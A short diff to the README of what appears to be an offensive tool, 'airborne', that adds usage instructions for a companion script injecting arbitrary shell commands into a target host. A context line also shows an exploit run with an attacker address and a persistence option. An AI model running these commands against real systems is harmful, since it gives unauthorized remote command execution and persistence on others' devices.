@@ -89,6 +89,12 @@ Enable real persistence on Linux targets:
 sudo python3 airborne.py --exploit 24132 --target 192.168.1.42 --attacker 192.168.1.99 --persistent
 ```
 
+Only shell command einjection
+
+```bash
+sudo python3 airborne_bash_command_injector.py --exploit 24132 --target 192.168.1.42 --command "command"
+```
+
 ---
 
 ## Payload Options
